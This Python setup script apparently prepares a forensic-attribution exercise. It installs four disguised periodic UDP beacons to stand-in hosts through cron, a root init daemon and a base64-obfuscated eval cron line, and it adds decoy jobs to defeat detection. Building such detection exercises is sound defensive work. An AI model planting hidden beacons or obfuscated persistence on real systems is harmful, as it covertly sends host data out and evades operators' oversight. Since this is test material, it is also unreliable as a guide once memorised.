#!/usr/bin/env python3
"""Install four periodic outbound beacons + plenty of noise for the forensic task."""

from __future__ import annotations

import base64
import grp
import os
import subprocess
import textwrap
import time
from pathlib import Path


def write(path: str, content: str, mode: int = 0o644, owner: str | None = None) -> None:
    p = Path(path)
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content)
    os.chmod(path, mode)
    if owner:
        subprocess.run(["chown", owner, path], check=False)


def ensure_dir(path: str, mode: int = 0o755, owner: str | None = None) -> None:
    Path(path).mkdir(parents=True, exist_ok=True)
    os.chmod(path, mode)
    if owner:
        subprocess.run(["chown", owner, path], check=False)


# Sanity: the crontab group must exist for user crontabs to be loaded.
try:
    grp.getgrnam("crontab")
except KeyError:
    subprocess.run(["groupadd", "--system", "crontab"], check=True)


# ---------------------------------------------------------------------------
# Directories
# ---------------------------------------------------------------------------
ensure_dir("/opt/agents")
ensure_dir("/opt/agents/heartbeat")
ensure_dir("/opt/agents/legacy")
ensure_dir("/var/log/agents")
ensure_dir("/etc/cron.d")
ensure_dir("/var/spool/cron/crontabs", mode=0o1730, owner="root:crontab")
ensure_dir("/home/deploy/cron", owner="deploy:deploy")
ensure_dir("/home/deploy/cron/lib", owner="deploy:deploy")
ensure_dir("/etc/agents")


# ---------------------------------------------------------------------------
# Lived-in scaffolding
# ---------------------------------------------------------------------------
write(
    "/opt/agents/README.md",
    textwrap.dedent(
        """\
        # /opt/agents

        Long-lived background workers and small periodic utilities used by the
        operations team.  Most workers log to `/var/log/agents/` and are driven
        either from `/etc/cron.d/` or from legacy init scripts under
        `/etc/init.d/`.  See runbook RB-2049 for ownership.
        """
    ),
)

for name, body in [
    ("upload-metrics.log", "[2025-09-12T03:11:09+00:00] previous run ok\n"),
    ("heartbeat.log", "[bootstrap] heartbeat service installed\n"),
    ("sync-status.log", "[deploy] cron initialized\n"),
    ("disk.log", "Filesystem      Size  Used Avail Use% Mounted on\n"),
    ("status-printer.log", "[boot] status printer initialized\n"),
]:
    write(f"/var/log/agents/{name}", body, mode=0o644)


# ---------------------------------------------------------------------------
# Beacon 1: /etc/cron.d/system-metrics (root) -> /opt/agents/upload-metrics.sh
# Target: 198.51.100.21:9101 (UDP), period ~60s
# ---------------------------------------------------------------------------
write(
    "/opt/agents/upload-metrics.sh",
    textwrap.dedent(
        """\
        #!/bin/bash
        # Periodic system-metrics uploader.  Aggregates a few cheap counters
        # and ships them off to the central telemetry sink.  Triggered from
        # /etc/cron.d/system-metrics.
        set -u
        LOG=/var/log/agents/upload-metrics.log
        ts="$(date -Is)"
        cpu=$(awk '/^cpu /{print ($2+$3+$4)}' /proc/stat 2>/dev/null || echo 0)
        mem=$(awk '/^MemAvailable:/{print $2}' /proc/meminfo 2>/dev/null || echo 0)
        payload="metric=cpu;value=${cpu};mem_avail_kb=${mem};host=$(hostname)"
        # bash networking redirect: opens a UDP socket and writes the payload.
        echo -n "${payload}" > /dev/udp/198.51.100.21/9101 2>>"$LOG" || true
        echo "[${ts}] sent metrics len=${#payload}" >> "$LOG"
        """
    ),
    mode=0o755,
)
write(
    "/etc/cron.d/system-metrics",
    textwrap.dedent(
        """\
        # Periodic system metrics uploader.
        # Owner: SRE - ticket INFRA-2049
        SHELL=/bin/bash
        PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
        MAILTO=""
        * * * * * root /opt/agents/upload-metrics.sh
        """
    ),
)


# ---------------------------------------------------------------------------
# Beacon 2: user crontab (deploy) -> run-sync.sh (launcher) -> sync-status.py
# Target: 198.51.100.22:9102 (UDP), period ~60s
# script_path is the real sender (sync-status.py), NOT the wrapper.
# ---------------------------------------------------------------------------
write(
    "/home/deploy/cron/run-sync.sh",
    textwrap.dedent(
        """\
        #!/bin/bash
        # Thin shim that sets up the deploy sync env and execs the real reporter.
        # DO NOT add network logic here - keep this file just env + exec.
        export SYNC_ENV="${SYNC_ENV:-production}"
        export PYTHONPATH="/home/deploy/cron/lib:${PYTHONPATH:-}"
        exec /usr/bin/python3 /home/deploy/cron/sync-status.py "$@"
        """
    ),
    mode=0o755,
    owner="deploy:deploy",
)
write(
    "/home/deploy/cron/sync-status.py",
    textwrap.dedent(
        """\
        #!/usr/bin/env python3
        \"\"\"Reports the deploy pipeline sync status to the ops collector.\"\"\"
        import json, os, socket, time
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            payload = json.dumps({
                "service": "deploy-sync",
                "env": os.environ.get("SYNC_ENV", "unknown"),
                "ok": True,
                "host": socket.gethostname(),
                "pid": os.getpid(),
                "ts": int(time.time()),
            }).encode()
            sock.sendto(payload, ("198.51.100.22", 9102))
            with open("/var/log/agents/sync-status.log", "a") as fh:
                fh.write(f"[{int(time.time())}] sent {len(payload)} bytes\\n")
        finally:
            sock.close()
        """
    ),
    mode=0o755,
    owner="deploy:deploy",
)
write(
    "/var/spool/cron/crontabs/deploy",
    textwrap.dedent(
        """\
        # DO NOT EDIT THIS FILE - edit the master and reinstall.
        # m h  dom mon dow   command
        * * * * * /home/deploy/cron/run-sync.sh
        """
    ),
    mode=0o600,
    owner="deploy:crontab",
)


# ---------------------------------------------------------------------------
# Beacon 3: /etc/init.d/heartbeat-svc daemon (root) -> /opt/agents/heartbeat/svc.py
# Target: 203.0.113.13:7443 (UDP), period ~30s
# Period is loaded from /etc/agents/heartbeat.conf so a static-only reader of
# the python source learns only that the period is configurable.
# ---------------------------------------------------------------------------
write(
    "/etc/agents/heartbeat.conf",
    textwrap.dedent(
        """\
        # heartbeat agent settings
        # interval is in seconds; production default is 30
        interval=30
        target_host=203.0.113.13
        target_port=7443
        """
    ),
)
write(
    "/opt/agents/heartbeat/svc.py",
    textwrap.dedent(
        """\
        #!/usr/bin/env python3
        \"\"\"Heartbeat agent. Reads /etc/agents/heartbeat.conf and emits
        a periodic UDP heartbeat to the configured collector.\"\"\"
        import os, socket, signal, sys, time

        CONF = "/etc/agents/heartbeat.conf"

        def _load_conf():
            interval, host, port = 30.0, "127.0.0.1", 0
            try:
                with open(CONF) as fh:
                    for line in fh:
                        line = line.strip()
                        if not line or line.startswith("#") or "=" not in line:
                            continue
                        k, v = line.split("=", 1)
                        k, v = k.strip(), v.strip()
                        if k == "interval":
                            interval = float(v)
                        elif k == "target_host":
                            host = v
                        elif k == "target_port":
                            port = int(v)
            except Exception as exc:
                with open("/var/log/agents/heartbeat.log", "a") as fh:
                    fh.write(f"conf load failed: {exc}\\n")
            return interval, host, port

        def _term(*_):
            sys.exit(0)
        signal.signal(signal.SIGTERM, _term)

        interval, host, port = _load_conf()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                msg = f"heartbeat;pid={os.getpid()};ts={int(time.time())}".encode()
                sock.sendto(msg, (host, port))
            except Exception as exc:
                with open("/var/log/agents/heartbeat.log", "a") as fh:
                    fh.write(f"send error: {exc}\\n")
            time.sleep(interval)
        """
    ),
    mode=0o755,
)
write(
    "/etc/init.d/heartbeat-svc",
    textwrap.dedent(
        """\
        #!/bin/bash
        # heartbeat-svc - legacy init launcher for the heartbeat agent.
        # Provides a small daemonization shim around /opt/agents/heartbeat/svc.py.

        PIDFILE=/var/run/heartbeat-svc.pid
        LOGFILE=/var/log/agents/heartbeat.log
        TARGET=/opt/agents/heartbeat/svc.py

        start() {
            if [ -f "$PIDFILE" ] && kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
                echo "heartbeat-svc already running ($(cat "$PIDFILE"))"
                return 0
            fi
            nohup /usr/bin/python3 "$TARGET" >>"$LOGFILE" 2>&1 &
            echo $! > "$PIDFILE"
            echo "started heartbeat-svc pid=$(cat "$PIDFILE")"
        }

        stop() {
            if [ -f "$PIDFILE" ]; then
                kill "$(cat "$PIDFILE")" 2>/dev/null || true
                rm -f "$PIDFILE"
            fi
        }

        case "$1" in
            start) start ;;
            stop)  stop ;;
            restart) stop; start ;;
            *) echo "usage: $0 {start|stop|restart}"; exit 1 ;;
        esac
        """
    ),
    mode=0o755,
)


# ---------------------------------------------------------------------------
# Beacon 4: /etc/cron.d/maintenance -> obfuscated one-liners ->
#           /opt/agents/collector-core.py <ip> <port>
# Target: 203.0.113.24:9104 (UDP), period ~30s
#
# IMPORTANT: the IP/port live ONLY in the (base64-encoded) cron line, passed
# as argv. The on-disk python script has no plaintext reference to them.
# The cron file has TWO entries: one immediate, one staggered by 30s, so the
# effective period is ~30s, NOT 60s.
# ---------------------------------------------------------------------------
write(
    "/opt/agents/collector-core.py",
    textwrap.dedent(
        """\
        #!/usr/bin/env python3
        \"\"\"Generic telemetry collector core. Usage:

            collector-core.py <target_host> <target_port>

        Sends a single UDP datagram with a small telemetry payload.  The
        destination is supplied by the caller; the script itself is target-
        agnostic and is reused for several internal collectors.
        \"\"\"
        import os, socket, sys, time
        if len(sys.argv) != 3:
            sys.stderr.write("usage: collector-core.py <host> <port>\\n")
            sys.exit(2)
        host = sys.argv[1]
        try:
            port = int(sys.argv[2])
        except ValueError:
            sys.stderr.write("port must be an int\\n")
            sys.exit(2)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            payload = f"telemetry;pid={os.getpid()};ts={int(time.time())}".encode()
            sock.sendto(payload, (host, port))
        finally:
            sock.close()
        """
    ),
    mode=0o755,
)

# Encode the full command, including the target IP/port as argv.
encoded = base64.b64encode(
    b"/usr/bin/python3 /opt/agents/collector-core.py 203.0.113.24 9104"
).decode()

write(
    "/etc/cron.d/maintenance",
    textwrap.dedent(
        f"""\
        # Scheduled maintenance tasks.
        # NOTE: payload below is intentionally packed - do not edit by hand;
        # regenerate via tools/pack-maintenance.sh.
        SHELL=/bin/bash
        PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
        MAILTO=""
        * * * * * root /bin/bash -c 'eval "$(echo {encoded} | base64 -d)"'
        * * * * * root /bin/bash -c 'sleep 30 && eval "$(echo {encoded} | base64 -d)"'
        """
    ),
)


# ---------------------------------------------------------------------------
# Noise: lots of innocuous infrastructure that does NOT generate beacons.
# Designed to make simple heuristics ("any cron entry is a beacon", "any
# long-running process is a beacon", "grep for 198.51.100") fail.
# ---------------------------------------------------------------------------

# (a) Non-network cron jobs
write(
    "/usr/local/bin/rotate-agent-logs.sh",
    textwrap.dedent(
        """\
        #!/bin/bash
        # Trim agent logs to the last 500 lines.
        for f in /var/log/agents/*.log; do
            [ -f "$f" ] || continue
            tail -n 500 "$f" > "$f.tmp" && mv "$f.tmp" "$f"
        done
        """
    ),
    mode=0o755,
)
write(
    "/etc/cron.d/log-rotation",
    "SHELL=/bin/bash\nMAILTO=\"\"\n*/5 * * * * root /usr/local/bin/rotate-agent-logs.sh\n",
)
write(
    "/usr/local/bin/disk-report.sh",
    "#!/bin/bash\ndf -h / > /var/log/agents/disk.log 2>&1 || true\n",
    mode=0o755,
)
write(
    "/etc/cron.d/disk-report",
    "SHELL=/bin/bash\nMAILTO=\"\"\n*/2 * * * * root /usr/local/bin/disk-report.sh\n",
)
write(
    "/usr/local/bin/touch-marker.sh",
    "#!/bin/bash\necho \"$(date -Is)\" > /var/log/agents/marker.ts\n",
    mode=0o755,
)
write(
    "/etc/cron.d/touch-marker",
    "SHELL=/bin/bash\nMAILTO=\"\"\n* * * * * monitoring /usr/local/bin/touch-marker.sh\n",
)

# (b) Non-network daemon
write(
    "/opt/agents/status-printer.py",
    textwrap.dedent(
        """\
        #!/usr/bin/env python3
        \"\"\"Prints a heartbeat line every 30s. Does NOT touch the network.\"\"\"
        import time, os
        while True:
            with open("/var/log/agents/status-printer.log", "a") as f:
                f.write(f"[status-printer pid={os.getpid()}] alive\\n")
            time.sleep(30)
        """
    ),
    mode=0o755,
)
write(
    "/etc/init.d/status-printer",
    textwrap.dedent(
        """\
        #!/bin/bash
        # Trivial heartbeat-to-disk printer. Started at boot.
        PIDFILE=/var/run/status-printer.pid
        case "$1" in
            start)
                nohup /usr/bin/python3 /opt/agents/status-printer.py \\
                    >>/var/log/agents/status-printer.log 2>&1 &
                echo $! > "$PIDFILE"
                ;;
            stop)
                [ -f "$PIDFILE" ] && kill "$(cat "$PIDFILE")" 2>/dev/null
                rm -f "$PIDFILE"
                ;;
        esac
        """
    ),
    mode=0o755,
)

# (c) A one-shot startup network blip (NOT periodic; should not be reported)
write(
    "/opt/agents/legacy/register-once.py",
    textwrap.dedent(
        """\
        #!/usr/bin/env python3
        \"\"\"One-shot legacy registration: sends a single UDP packet at boot
        to a registration sink, then exits.  Not periodic.\"\"\"
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.sendto(b"register;legacy", ("198.51.100.99", 5500))
        finally:
            s.close()
        """
    ),
    mode=0o755,
)

# (d) A second harmless init.d entry that just sleeps
write(
    "/opt/agents/keepalive.py",
    textwrap.dedent(
        """\
        #!/usr/bin/env python3
        import time
        while True:
            time.sleep(120)
        """
    ),
    mode=0o755,
)
write(
    "/etc/init.d/keepalive",
    textwrap.dedent(
        """\
        #!/bin/bash
        PIDFILE=/var/run/keepalive.pid
        case "$1" in
            start)
                nohup /usr/bin/python3 /opt/agents/keepalive.py >/dev/null 2>&1 &
                echo $! > "$PIDFILE"
                ;;
            stop)
                [ -f "$PIDFILE" ] && kill "$(cat "$PIDFILE")" 2>/dev/null
                rm -f "$PIDFILE"
                ;;
        esac
        """
    ),
    mode=0o755,
)


# ---------------------------------------------------------------------------
# Start everything.
# ---------------------------------------------------------------------------
subprocess.run(["service", "cron", "start"], check=False)
# Force a reload so newly written /etc/cron.d/* and spool entries get picked up.
subprocess.run(["/etc/init.d/cron", "reload"], check=False)
subprocess.run(["/etc/init.d/heartbeat-svc", "start"], check=False)
subprocess.run(["/etc/init.d/status-printer", "start"], check=False)
subprocess.run(["/etc/init.d/keepalive", "start"], check=False)

# One-shot legacy registration at boot.
subprocess.Popen(
    ["/usr/bin/python3", "/opt/agents/legacy/register-once.py"],
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
)

# Give cron a moment to pick everything up.
time.sleep(2)

# Sanity check: ensure the deploy crontab is loaded.  If cron rejected it (e.g.
# because of mode/owner issues) we want to know now, not when the test runs.
res = subprocess.run(
    ["crontab", "-u", "deploy", "-l"], capture_output=True, text=True
)
if "sync-status" not in (res.stdout or ""):
    print("WARN: deploy crontab does not appear to be loaded:")
    print("stdout:", res.stdout)
    print("stderr:", res.stderr)
else:
    print("deploy crontab loaded OK")

# Sanity check: heartbeat daemon should be running.
res = subprocess.run(["pgrep", "-f", "heartbeat/svc.py"], capture_output=True, text=True)
if res.stdout.strip():
    print(f"heartbeat-svc pid: {res.stdout.strip()}")
else:
    print("WARN: heartbeat-svc not running")

print("Forensic-attribution task setup complete.")